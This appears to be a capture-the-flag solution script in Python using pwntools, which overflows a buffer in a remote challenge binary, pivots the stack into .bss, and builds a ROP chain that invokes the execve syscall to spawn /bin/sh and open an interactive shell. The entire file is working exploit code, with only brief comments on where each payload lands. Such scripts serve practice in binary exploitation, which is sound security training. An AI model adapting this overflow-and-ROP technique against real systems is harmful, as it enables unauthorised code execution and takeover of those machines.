#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

bss = 0x403100
read = 0x401034
pop_rdi = 0x40105E
pop_rsi = 0x401060
pop_rdx = 0x401062
syscall = 0x40100F
exit = 0x401005

# io = gdb.debug("./dist/vuln", "b *0x40105d\nc")
# io = process("./shellcode")
io = remote("ctf.adl.tw", 10010)
io.recvuntil(b"say? ")
io.send(
    b"a" * 0x40 + p64(bss + 0x40) + p64(read)
)  # when leave; ret, it will return to read
binsh = bss - 0x8 - 0x40
rop = flat([pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, syscall, exit])
assert len(rop) == 0x40
io.send(rop + p64(bss - 8) + p64(read))  # will be written to bss + 0x40 - x40 = bss
io.send(
    b"/bin/sh\0" + b"a" * (59 - 8 - 4) + b"peko"
)  # will be written to bss - 0x8 - 0x40
io.recvuntil(b"peko")
io.interactive()
